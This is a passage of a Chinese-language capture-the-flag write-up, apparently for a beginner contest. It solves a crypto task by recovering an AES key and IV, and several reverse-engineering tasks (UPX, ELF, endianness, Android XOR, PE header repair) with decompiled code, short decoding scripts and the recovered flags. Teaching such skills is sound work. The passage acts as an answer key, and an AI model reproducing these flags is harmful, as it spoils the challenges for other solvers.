+
+Copy
+
+```
+xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
+xor_result_bytes = long_to_bytes(xor_result ^ 1)
+key = xor_result_bytes[:16] * 2
+print(f'key = {key}')
+iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
+print(f'iv = {iv}')
+# key = b'\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,'
+# iv = b'\xe3Z\x19Ga>\x07\xcc\xd1\xa1X\x01c\x11\x16\x00'
+```
+
+将解出的 key 和 iv 丢进 AES 中进行解密即可得到 flag，完整脚本如下
+
+Copy
+
+```
+from Crypto.Cipher import AES
+from Crypto.Util.number import *
+
+xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
+enc_flag = b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
+
+xor_result_bytes = long_to_bytes(xor_result ^ 1)
+print(xor_result_bytes)
+
+key = xor_result_bytes[:16] * 2
+print(f'key = {key}')
+
+iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
+print(f'iv = {iv}')
+
+aes = AES.new(key, AES.MODE_CBC, iv)
+dec_flag = aes.decrypt(enc_flag)
+
+print(dec_flag)
+# b'firsT_cry_Aes\x00\x00\x00'
+```
+
+## Reverse
+
+### [Week 1]easy_RE
+
+用 ida64 打开可以得到前半部分 flag ，如下图
+
+
+
+通过按 F5 反编译可以得到后半部分 flag ，如下图
+
+![image-20240426221415831](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240426221415831.png)
+
+故 flag 如下
+
+Copy
+
+```
+flag{we1c0me_to_rev3rse!!}}
+```
+
+### [Week 1]咳
+
+题目描述中存在壳，用查壳软件看看，如下图
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FjJRCfmdtbKA2NAxc3iF8%252F%25E5%2592%25B3-1.png%3Falt%3Dmedia%26token%3D8388cf8a-b1de-4ec0-a465-2792fded509c&width=768&dpr=4&quality=100&sign=b315f35440a8f65852bc75987e8558f820e38fb7226319e7522eabe240a6f58c)
+
+需要使用 upx 去壳，如下
+
+Copy
+
+```
+$ upx -d "KE.exe"
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    133760 <-     68224   51.00%    win64/pe     KE.exe
+
+Unpacked 1 file.
+```
+
+去壳完成后用 ida64 打开，通过反编译可以得到以下内容
+
+Copy
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int64 i; // r10
+  char *v4; // kr00_8
+  char Str1[96]; // [rsp+20h] [rbp-88h] BYREF
+  int v7; // [rsp+80h] [rbp-28h]
+
+  _main();
+  memset(Str1, 0, sizeof(Str1));
+  v7 = 0;
+  Hello();
+  scanf("%s", Str1);
+  for ( i = 0i64; ; ++i )
+  {
+    v4 = &Str1[strlen(Str1)];
+    if ( i >= v4 - Str1 )
+      break;
+    ++Str1[i];
+  }
+  if ( !strncmp(Str1, enc, v4 - Str1) )
+    puts("WOW!!");
+  else
+    puts("I believe you can do it!");
+  system("pause");
+  return 0;
+}
+```
+
+并且可以找到
+
+Copy
+
+```
+enc = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
+```
+
+通过分析可得该函数将密文是由明文的每个字符转ascii值后加一得到的，要得到明文则将每个字符的ascii值减一即可。
+
+Copy
+
+```
+str = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
+for s in str:
+    print(chr(ord(s) - 1), end='')
+
+# flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}
+```
+
+### [Week 1]Segments
+
+百度 `IDA的Segments窗口要怎么打开呢` ，可以得到结果 `Shift+F7` ，将 Segments 窗口中的 name 拼凑起来就是 flag。
+
+Copy
+
+```
+flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
+```
+
+### [Week 1]ELF
+
+用 ida64 打开，通过反编译可以得到以下内容
+
+Copy
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // edx
+  char *s1; // [rsp+0h] [rbp-20h]
+  char *v6; // [rsp+8h] [rbp-18h]
+  char *s; // [rsp+10h] [rbp-10h]
+
+  s = (char *)malloc(0x64uLL);
+  printf("Input flag: ");
+  fgets(s, 100, stdin);
+  s[strcspn(s, "\n")] = 0;
+  v6 = (char *)encode(s);
+  v3 = strlen(v6);
+  s1 = (char *)base64_encode(v6, v3);
+  if ( !strcmp(s1, "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t") )
+    puts("Correct");
+  else
+    puts("Wrong");
+  free(v6);
+  free(s1);
+  free(s);
+  return 0;
+}
+
+_BYTE *__fastcall encode(const char *a1)
+{
+  size_t v1; // rax
+  int v2; // eax
+  _BYTE *v4; // [rsp+20h] [rbp-20h]
+  int i; // [rsp+28h] [rbp-18h]
+  int v6; // [rsp+2Ch] [rbp-14h]
+
+  v1 = strlen(a1);
+  v4 = malloc(2 * v1 + 1);
+  v6 = 0;
+  for ( i = 0; i < strlen(a1); ++i )
+  {
+    v2 = v6++;
+    v4[v2] = (a1[i] ^ 0x20) + 16;
+  }
+  v4[v6] = 0;
+  return v4;
+}
+```
+
+通过分析可知密文是由明文的每个字符与 0x20 进行异或后加 16 并进行 base64 编码得到的，要得到明文则先进行 base64 解码后将所得的每个位减去 16 再和 0x20 异或即可，脚本如下。
+
+Copy
+
+```
+import base64
+
+encoded_str = "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t"
+decoded_bytes = base64.b64decode(encoded_str)
+print(decoded_bytes)
+for s in decoded_bytes:
+    print(chr((s - 16) ^ 0x20), end="")
+    
+# flag{D0_4ou_7now_wha7_ELF_1s?}
+```
+
+### [Week 1]Endian
+
+用 ida64 打开，通过反编译可以得到以下内容
+
+Copy
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+4h] [rbp-3Ch]
+  char *v5; // [rsp+8h] [rbp-38h]
+  char v6[40]; // [rsp+10h] [rbp-30h] BYREF
+  unsigned __int64 v7; // [rsp+38h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  puts("please input your flag");
+  __isoc99_scanf("%s", v6);
+  v5 = v6;
+  for ( i = 0; i <= 4; ++i )
+  {
+    if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) )
+    {
+      printf("wrong!");
+      exit(0);
+    }
+    v5 += 4;
+  }
+  printf("you are right");
+  return 0;
+}
+```
+
+并且 array 数组内容如下
+
+Copy
+
+```
+array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
+```
+
+通过分析可知密文是通过将明文每四个为一组和 0x12345678 进行异或后得到的，但由于是低位存储，所以需要将每一组逆向过来的值进行反向即可得到 flag，脚本如下
+
+Copy
+
+```
+from Crypto.Util.number import long_to_bytes
+
+array_data = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
+for data in array_data:
+    print(bytes(reversed(long_to_bytes(data ^ 0x12345678))).decode(), end='')
+    
+# flag{llittl_Endian_a}
+```
+
+### [Week 1]AndroXor
+
+> https://apktool.org/
+>
+> https://github.com/skylot/jadx
+
+可以在上述引用中下载 apktool ，下载后使用 apktool 进行逆向
+
+Copy
+
+```
+$ apktool d AndroXor.apk
+```
+
+逆向后使用 jadx 打开进行 Java 反编译，在 `com/chick.androxor/MainActivity` 中存在以下内容
+
+Copy
+
+```
+    public String Xor(String str, String str2) {
+        char[] cArr = {14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r'};
+        char[] cArr2 = new char[str.length()];
+        String str3 = str.length() != 25 ? "wrong!!!" : "you win!!!";
+        for (int i = 0; i < str.length(); i++) {
+            char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length()));
+            cArr2[i] = charAt;
+            if (cArr[i] != charAt) {
+                return "wrong!!!";
+            }
+        }
+        return str3;
+    }
+
+	@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
+        this.binding = inflate;
+        setContentView(inflate.getRoot());
+        final EditText editText = (EditText) findViewById(R.id.password);
+        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { // from class: com.chick.androxor.MainActivity.1
+            @Override // android.view.View.OnClickListener
+            public void onClick(View view) {
+                String obj = editText.getText().toString();
+                MainActivity mainActivity = MainActivity.this;
+                Toast.makeText(mainActivity, mainActivity.Xor(obj, "happyx3"), 1).show();
+                Log.d("输入", editText.getText().toString());
+            }
+        });
+    }
+```
+
+通过分析可得明文长度为 25，并且代码将循环遍历明文每一个字符，并使用每个字符与第二个参数字符串(happyx3)的对应位置字符进行异或运算，将得到的新字符添加到 cArr2 中，并且还会将cArr2中的字符与cArr中的对应位置字符进行比较。
+
+因此要获得明文需要对应位置逐个异或运算推回来即可，先将 cArr 数字中的其他值都转化为 ascii 值形态，再进行异或运算，将运算结果转回字符即可，脚本如下
+
+Copy
+
+```
+cArr = [14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r']
+str = ""
+str2 = "happyx3"
+
+def convert_to_ord(lst):
+    for i in range(len(lst)):
+        if not isinstance(lst[i], int):
+            lst[i] = ord(lst[i])
+    return lst
+
+cArr = convert_to_ord(cArr)
+
+for i in range(25):
+    str += chr(cArr[i] ^ ord(str2[i % len(str2)]))
+
+print(str)
+
+# flag{3z_And0r1d_X0r_x1x1}
+```
+
+### [Week 1]EzPE
+
+下载附件后用查壳工具查发现无法查出来，用 010 打开和其他 exe 文件对比发现缺失了文件头部分，需将文件头部分进行修复。
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FMEPGebOjUqq8l8DrWOab%252FEzPE-1.png%3Falt%3Dmedia%26token%3D61a87172-da22-4f40-b6a3-8e554f54118d&width=768&dpr=4&quality=100&sign=77123c2bab2b6b0abfaa19527042e71919efd1de307ccc5a32f152ec991ad61b)
+
+用 ida64 打开，通过反编译可以得到以下内容
+
+Copy
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+2Ch] [rbp-4h]
+
+  _main(argc, argv, envp);
+  puts(&draw);
+  puts("Please enter your flag!\n");
+  scanf("%s", input);
+  for ( i = 0; i < strlen(input) - 1; ++i )
+    input[i] ^= i ^ input[i + 1];
+  if ( !strcmp(input, data) )
+    puts("You Win!");
+  else
+    puts("You lose!");
+  system("pause");
+  return 0;
+}
+```
+
+并且 data 数组内容如下
+
+Copy
+
+```
+array_data = [
+  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
+  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
+  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
+  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
+]
+```
+
+通过分析可得密文由将明文的每个字符与其下一个字符以及当前 index 值进行异或运算，并将结果赋值给当前字符，因此要逆向回来只需要倒转反过来即可，脚本如下
+
+Copy
+
+```
+array_data = [
+  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
+  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
+  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
+  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
+]
+print(len(array_data))
+for i in range(len(array_data) - 2, 0, -1):
+    array_data[i] ^= i ^ array_data[i + 1]
+print(''.join(chr(data) for data in array_data))
+
+# flag{Y0u_kn0w_what_1s_PE_File_F0rmat}
+```
+
+### [Week 1]lazy_activtiy
+
+> https://github.com/liaojack8/AndroidKiller
+
+使用 AndroidKiller 打开后搜索 flag 即可得到 flag。
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FZl7WLJOue4Uv9zlfSF1T%252Flazy_activtiy-1.png%3Falt%3Dmedia%26token%3D36498bef-15b7-4f75-a37b-1e899525c9b5&width=768&dpr=4&quality=100&sign=7a8856c106556e0aeea2da78dd92d611d36371a3bf0417237ca6d33703e40e46)
+
+Copy
+
+```
+flag{Act1v1ty_!s_so00oo0o_Impor#an#}
+```
+
+###  
